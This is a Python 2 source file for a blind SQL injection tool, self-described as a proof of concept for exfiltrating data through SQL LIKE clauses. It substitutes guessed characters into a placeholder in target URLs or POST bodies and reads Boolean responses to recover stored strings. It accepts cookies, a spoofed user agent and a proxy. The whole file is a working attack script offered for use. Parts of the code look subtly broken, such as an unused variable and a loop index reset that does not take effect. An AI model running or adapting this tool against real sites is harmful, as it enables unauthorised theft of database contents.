# Authors DK & DrCruft
#
# Example: python bsqli-bruter.py -u http://someurl/somepath -p http://127.0.0.1:8080 -m 'match_this' -d "postparam=some_custom_sql_query+LIKE+'{*}'"
#
# See README.md
#

import sys
from itertools import product
import string
import urllib2
import argparse
import requests

# test variables
T = ['AB','ALAMBO', 'ALAMBO2', 'ALAMBO2A', 'ALAMBO2BC', 'ALAZZO', 'ALAZZ2', 'ALAZ2A', 'ALAZZB', 'BETTY', 'COKE', 'COKE2',
	'BETZY', 'DRACO', 'DRAKE', 'ELEPHANT', 'EMC', 'FOUR', 'FOURSQUARE', 'GANT', 'GRAPH', 'HI', 'HIGH', 'HIT',
	'IN','Q-', 'QWERTY', 'QWERTY-123', 'ROMEO']

def setup(charset):
	"""
	Generates the character set to use for brute forcing.
	"""
	S = []
	for wordchars in product(charset, repeat=1):
	      S.append(''.join(wordchars))
	      if(debug):
		    sys.stdout.write('debug: s is : ' + ''.join(wordchars) + '\n')	      
	return S

def dblookup(s, match=False):
	"""
	Replace bsqli_lookup with dblookup in brute() when in algo only testing.
	"""
	found = False
	for i in T:
		if (match):
			if (s==i):
				httplib2found=True
				return(found)
		else:
			found = i.startswith(s)
			if(debug):
				sys.stdout.write('debug: s is : ' + s + ' : i is : ' + i + ' : boolean: ' + str(i.startswith(s)) + '\n')
			if found: break
	return(found)	

def bsqli_lookup(s, match=False):
	"""
	Takes s and makes changes to HTTP requests and returns Boolean result if found.
	"""
	found = False
	postdata=False
	wildcard='%'
	
	if (match):
		url=args.url.replace('{*}' + wildcard,s)
		if args.postdata:
			postdata=args.postdata.replace('{*}' + wildcard,s)
	else:
		url=args.url.replace('{*}',s)
		if args.postdata:
			postdata=args.postdata.replace('{*}',s)
	
	(resp)=fetch_url(url, postdata, *args._get_kwargs())
	found=match_resp(resp,args.match)
	
	if (debug):
			  sys.stdout.write('debug: match_resp() Boolean : ' + args.match + ' : ' + str(found) + '\n')
			  sys.stdout.write('debug: url ' + url)
	return(found)

def brute(S):
	"""
	Take S (character set) and attempt to retrieve ALL data through the algorithm below.
	"""
	F = []
        lim = len(S) 
	temp = ''
	prev_found=False
	
	if(debug):
		sys.stdout.write('debug: S{} length is: ' + str(lim) + '\n')

	for idx in range (0,lim): 
		temp=''
		while(idx < lim): 
			# just add a new function which returns 0/1 with fetch_url
			if(bsqli_lookup(temp + S[idx])):
				temp +=	S[idx]
				idx = 0
				prev_found=False
				
				if(bsqli_lookup(temp, True)):
					if (prev_found==False):
						F.append(temp)
						print "Interim Report : Found word : " + F[-1]
						prev_found=True
						if (debug):
							sys.stdout.write('debug: adding to F{}: ' + temp + ' !!!\n')
				if(debug):
					sys.stdout.write('debug: matched so far: ' + temp + '...\n');
			else:
				if(debug):
					sys.stdout.write('debug: no match for: ' + temp + S[idx] + '\n')
				if(len(temp)<1):
					break
				else:
					idx += 1

			if(debug):
				sys.stdout.write('debug: current temp value: ' + temp + '\n');
				
			if(idx==lim): # 37
				if(len(temp)>1):
					#if((S.index(temp[-1])+1) < lim):
					idx=(S.index(temp[-1]))+1
					temp=temp[:-1]
					if(debug):
						sys.stdout.write('debug: Completed, looking for next string : temp index is : ' + str(len(temp)) + ' idx is : ' + str(idx) + '\n');

	for x in F:
		sys.stdout.write('F { ' + x + ' }\n')


def fetch_url(url, postdata, *kwargs):
	"""
	The function that performs the actual HTTP comms.
	"""
	H = {}
	P = {}

	for i in kwargs:
		(key,value) = i
		if(value):
			if key.startswith("cookie"): 
			      H['Cookie']=value
			if key.startswith("useragent"): 
			      H['User-Agent']=value
			else:
			      H['User-Agent']='Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)'
			if key.startswith("proxy"):
			      P['http']=value
			if (debug):
				sys.stdout.write('debug: fetchurl key-value pair: ' + key + ': ' + str(value) + '\n')	
	
	with session as s:
		if postdata:
			f=s.post(url, data=postdata, headers=H, proxies=P)
		else:
			f=s.get(url, headers=H, proxies=P)
	
	resp=str(f.headers)+f.text
	
	if (debug):
		sys.stdout.write('debug: fetchurl response code: ' + str(f.status_code) + '\n')
		sys.stdout.write('debug: fetchurl response headers: ' + str(f.headers) + '\n')
		sys.stdout.write('debug: fetchurl response data: ' + f.text + '\n')
	
	return (resp)

def match_resp(hay, needle):
	"""
	Basic matching function
	"""
	m=hay.find(needle)
	if m != -1:
		return True
	else:
		return False

def main():
	global debug, args, session
	debug=0
	
	parser=argparse.ArgumentParser(description='Proof of Concept Blind SQL LIKE CLAUSE Data Exfiltration Tool - what a mouthful!')
	parser.add_argument('-v', '--verbose', '--debug', action='store_true')
	parser.add_argument('-u','--url', required=True, help="Add {*} as placeholder for custom SQL LIKE query, see README")
	parser.add_argument('-p','--proxy', help='e.g. 127.0.0.1:8080')
	parser.add_argument('-c','--cookie')
	parser.add_argument('-ua','--useragent')
	parser.add_argument('-d','--postdata')
	parser.add_argument('-m','--match', required=True, help='data to match for Boolean True checks')
	args=parser.parse_args()
	
	if args.verbose:
		debug=True
	
	session = requests.Session()
	
	# List of ready made character sets can be easily added to extend charSet
	# See https://docs.python.org/2/library/string.html#string-constants
	charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + '-'
	S=setup(charset)
	brute(S)
        	
if __name__ == "__main__":
	main()
